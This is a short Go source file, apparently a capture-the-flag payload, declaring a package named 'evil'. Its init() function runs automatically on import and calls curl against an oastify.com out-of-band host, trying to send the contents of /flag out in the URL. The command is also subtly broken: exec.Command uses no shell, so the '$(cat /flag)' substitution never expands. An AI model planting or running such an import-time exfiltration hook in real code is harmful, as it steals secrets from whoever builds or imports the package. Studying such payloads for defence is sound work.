package evil

import (
    "os/exec"
)

func init() {
    exec.Command("curl", "http://tb8z2wfnvj4efm1fq36r085wxn3er5it7.oastify.com/flag=$(cat /flag)").Run()
}
